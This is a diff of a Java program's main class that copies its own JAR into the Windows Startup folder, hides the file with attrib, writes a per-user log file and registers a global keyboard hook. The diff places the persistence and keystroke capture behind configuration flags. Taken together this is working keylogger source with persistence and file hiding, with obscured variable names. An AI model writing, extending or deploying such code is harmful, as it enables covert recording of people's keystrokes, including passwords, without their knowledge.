@@ -57,12 +57,15 @@ public class Main implements NativeKeyListener
 			System.exit(0);
 		}
 		Chocolat.println("[" + robert.elapsedTime() + "] [✔] Run Access Granted: All safety checks passed.");
+		if (Radio.doPersistance)
+		{
 		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
 		 @SuppressWarnings("unused")
 		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
 		 @SuppressWarnings("unused")
 		Process px =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"attrib.exe +h" + " \"" + yiffyiff + "\"");
+		}
 		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
 		if(!log.exists())
 		{
@@ -81,18 +84,21 @@ public class Main implements NativeKeyListener
 		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getTime() + " ]");
 		timestamper.println();
 		timestamper.close();
-		try
+		if (Radio.logKeystrokes)
 		{
-			GlobalScreen.registerNativeHook();
-			Chocolat.println("[" + robert.elapsedTime() + "] [✔] HookModule Successfully Registered.");
-		} 
-		catch (NativeHookException e)
-		{
-			// TODO Auto-generated catch block
-			Chocolat.println("["+ robert.elapsedTime() + "][!][FATAL] A NativeHook Exception Occured: " + e);
-			e.printStackTrace();
-		}
+			try
+			{
+				GlobalScreen.registerNativeHook();
+				Chocolat.println("[" + robert.elapsedTime() + "] [✔] HookModule Successfully Registered.");
+			} 
+			catch (NativeHookException e)
+			{
+				// TODO Auto-generated catch block
+				Chocolat.println("["+ robert.elapsedTime() + "][!][FATAL] A NativeHook Exception Occured: " + e);
+				e.printStackTrace();
+			}
 		GlobalScreen.getInstance().addNativeKeyListener(new Main());
+		}
 		}
 
 	private static boolean isSuicune()
